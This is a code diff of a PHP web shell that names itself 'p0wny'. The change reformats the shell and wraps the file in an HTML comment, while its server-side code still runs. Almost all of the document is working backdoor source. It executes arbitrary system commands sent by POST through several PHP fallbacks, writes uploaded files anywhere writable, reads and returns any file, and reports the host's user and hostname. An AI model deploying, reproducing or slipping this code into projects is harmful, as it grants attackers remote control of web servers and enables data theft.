@@ -1,191 +1,201 @@
-<?php
+<!-- <?php
 
-$SHELL_CONFIG = array(
-    'username' => 'p0wny',
-    'hostname' => 'shell',
-);
-
-function expandPath($path) {
-    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
-        exec("echo $match[1]", $stdout);
-        return $stdout[0] . $match[2];
-    }
-    return $path;
-}
-
-function allFunctionExist($list = array()) {
-    foreach ($list as $entry) {
-        if (!function_exists($entry)) {
-            return false;
-        }
-    }
-    return true;
-}
-
-function executeCommand($cmd) {
-    $output = '';
-    if (function_exists('exec')) {
-        exec($cmd, $output);
-        $output = implode("\n", $output);
-    } else if (function_exists('shell_exec')) {
-        $output = shell_exec($cmd);
-    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
-        ob_start();
-        system($cmd);
-        $output = ob_get_contents();
-        ob_end_clean();
-    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
-        ob_start();
-        passthru($cmd);
-        $output = ob_get_contents();
-        ob_end_clean();
-    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
-        $handle = popen($cmd, 'r');
-        while (!feof($handle)) {
-            $output .= fread($handle, 4096);
-        }
-        pclose($handle);
-    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
-        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
-        $output = stream_get_contents($pipes[1]);
-        proc_close($handle);
-    }
-    return $output;
-}
-
-function isRunningWindows() {
-    return stripos(PHP_OS, "WIN") === 0;
-}
-
-function featureShell($cmd, $cwd) {
-    $stdout = "";
-
-    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
-        chdir(expandPath("~"));
-    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
-        chdir($cwd);
-        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
-        chdir(expandPath($match[1]));
-    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
-        chdir($cwd);
-        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
-        return featureDownload($match[1]);
-    } else {
-        chdir($cwd);
-        $stdout = executeCommand($cmd);
-    }
-
-    return array(
-        "stdout" => base64_encode($stdout),
-        "cwd" => base64_encode(getcwd())
-    );
-}
-
-function featurePwd() {
-    return array("cwd" => base64_encode(getcwd()));
-}
-
-function featureHint($fileName, $cwd, $type) {
-    chdir($cwd);
-    if ($type == 'cmd') {
-        $cmd = "compgen -c $fileName";
-    } else {
-        $cmd = "compgen -f $fileName";
-    }
-    $cmd = "/bin/bash -c \"$cmd\"";
-    $files = explode("\n", shell_exec($cmd));
-    foreach ($files as &$filename) {
-        $filename = base64_encode($filename);
-    }
-    return array(
-        'files' => $files,
-    );
-}
-
-function featureDownload($filePath) {
-    $file = @file_get_contents($filePath);
-    if ($file === FALSE) {
-        return array(
-            'stdout' => base64_encode('File not found / no read permission.'),
-            'cwd' => base64_encode(getcwd())
+        $SHELL_CONFIG = array(
+            'username' => 'p0wny',
+            'hostname' => 'shell',
         );
-    } else {
-        return array(
-            'name' => base64_encode(basename($filePath)),
-            'file' => base64_encode($file)
-        );
-    }
-}
 
-function featureUpload($path, $file, $cwd) {
-    chdir($cwd);
-    $f = @fopen($path, 'wb');
-    if ($f === FALSE) {
-        return array(
-            'stdout' => base64_encode('Invalid path / no write permission.'),
-            'cwd' => base64_encode(getcwd())
-        );
-    } else {
-        fwrite($f, base64_decode($file));
-        fclose($f);
-        return array(
-            'stdout' => base64_encode('Done.'),
-            'cwd' => base64_encode(getcwd())
-        );
-    }
-}
-
-function initShellConfig() {
-    global $SHELL_CONFIG;
-
-    if (isRunningWindows()) {
-        $username = getenv('USERNAME');
-        if ($username !== false) {
-            $SHELL_CONFIG['username'] = $username;
-        }
-    } else {
-        $pwuid = posix_getpwuid(posix_geteuid());
-        if ($pwuid !== false) {
-            $SHELL_CONFIG['username'] = $pwuid['name'];
-        }
-    }
-
-    $hostname = gethostname();
-    if ($hostname !== false) {
-        $SHELL_CONFIG['hostname'] = $hostname;
-    }
-}
-
-if (isset($_GET["feature"])) {
-
-    $response = NULL;
-
-    switch ($_GET["feature"]) {
-        case "shell":
-            $cmd = $_POST['cmd'];
-            if (!preg_match('/2>/', $cmd)) {
-                $cmd .= ' 2>&1';
+        function expandPath($path)
+        {
+            if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
+                exec("echo $match[1]", $stdout);
+                return $stdout[0] . $match[2];
             }
-            $response = featureShell($cmd, $_POST["cwd"]);
-            break;
-        case "pwd":
-            $response = featurePwd();
-            break;
-        case "hint":
-            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
-            break;
-        case 'upload':
-            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
-    }
+            return $path;
+        }
 
-    header("Content-Type: application/json");
-    echo json_encode($response);
-    die();
-} else {
-    initShellConfig();
-}
+        function allFunctionExist($list = array())
+        {
+            foreach ($list as $entry) {
+                if (!function_exists($entry)) {
+                    return false;
+                }
+            }
+            return true;
+        }
 
-?><!DOCTYPE html>
+        function executeCommand($cmd)
+        {
+            $output = '';
+            if (function_exists('exec')) {
+                exec($cmd, $output);
+                $output = implode("\n", $output);
+            } else if (function_exists('shell_exec')) {
+                $output = shell_exec($cmd);
+            } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
+                ob_start();
+                system($cmd);
+                $output = ob_get_contents();
+                ob_end_clean();
+            } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
+                ob_start();
+                passthru($cmd);
+                $output = ob_get_contents();
+                ob_end_clean();
+            } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
+                $handle = popen($cmd, 'r');
+                while (!feof($handle)) {
+                    $output .= fread($handle, 4096);
+                }
+                pclose($handle);
+            } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
+                $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
+                $output = stream_get_contents($pipes[1]);
+                proc_close($handle);
+            }
+            return $output;
+        }
+
+        function isRunningWindows()
+        {
+            return stripos(PHP_OS, "WIN") === 0;
+        }
+
+        function featureShell($cmd, $cwd)
+        {
+            $stdout = "";
+
+            if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
+                chdir(expandPath("~"));
+            } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
+                chdir($cwd);
+                preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
+                chdir(expandPath($match[1]));
+            } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
+                chdir($cwd);
+                preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
+                return featureDownload($match[1]);
+            } else {
+                chdir($cwd);
+                $stdout = executeCommand($cmd);
+            }
+
+            return array(
+                "stdout" => base64_encode($stdout),
+                "cwd" => base64_encode(getcwd())
+            );
+        }
+
+        function featurePwd()
+        {
+            return array("cwd" => base64_encode(getcwd()));
+        }
+
+        function featureHint($fileName, $cwd, $type)
+        {
+            chdir($cwd);
+            if ($type == 'cmd') {
+                $cmd = "compgen -c $fileName";
+            } else {
+                $cmd = "compgen -f $fileName";
+            }
+            $cmd = "/bin/bash -c \"$cmd\"";
+            $files = explode("\n", shell_exec($cmd));
+            foreach ($files as &$filename) {
+                $filename = base64_encode($filename);
+            }
+            return array(
+                'files' => $files,
+            );
+        }
+
+        function featureDownload($filePath)
+        {
+            $file = @file_get_contents($filePath);
+            if ($file === FALSE) {
+                return array(
+                    'stdout' => base64_encode('File not found / no read permission.'),
+                    'cwd' => base64_encode(getcwd())
+                );
+            } else {
+                return array(
+                    'name' => base64_encode(basename($filePath)),
+                    'file' => base64_encode($file)
+                );
+            }
+        }
+
+        function featureUpload($path, $file, $cwd)
+        {
+            chdir($cwd);
+            $f = @fopen($path, 'wb');
+            if ($f === FALSE) {
+                return array(
+                    'stdout' => base64_encode('Invalid path / no write permission.'),
+                    'cwd' => base64_encode(getcwd())
+                );
+            } else {
+                fwrite($f, base64_decode($file));
+                fclose($f);
+                return array(
+                    'stdout' => base64_encode('Done.'),
+                    'cwd' => base64_encode(getcwd())
+                );
+            }
+        }
+
+        function initShellConfig()
+        {
+            global $SHELL_CONFIG;
+
+            if (isRunningWindows()) {
+                $username = getenv('USERNAME');
+                if ($username !== false) {
+                    $SHELL_CONFIG['username'] = $username;
+                }
+            } else {
+                $pwuid = posix_getpwuid(posix_geteuid());
+                if ($pwuid !== false) {
+                    $SHELL_CONFIG['username'] = $pwuid['name'];
+                }
+            }
+
+            $hostname = gethostname();
+            if ($hostname !== false) {
+                $SHELL_CONFIG['hostname'] = $hostname;
+            }
+        }
+
+        if (isset($_GET["feature"])) {
+
+            $response = NULL;
+
+            switch ($_GET["feature"]) {
+                case "shell":
+                    $cmd = $_POST['cmd'];
+                    if (!preg_match('/2>/', $cmd)) {
+                        $cmd .= ' 2>&1';
+                    }
+                    $response = featureShell($cmd, $_POST["cwd"]);
+                    break;
+                case "pwd":
+                    $response = featurePwd();
+                    break;
+                case "hint":
+                    $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
+                    break;
+                case 'upload':
+                    $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+            }
+
+            header("Content-Type: application/json");
+            echo json_encode($response);
+            die();
+        } else {
+            initShellConfig();
+        }
+
+        ?><!DOCTYPE html>
 
 <html>
 
@@ -602,4 +612,4 @@ if (isset($_GET["feature"])) {
         </div>
     </body>
 
-</html>
+</html> -->
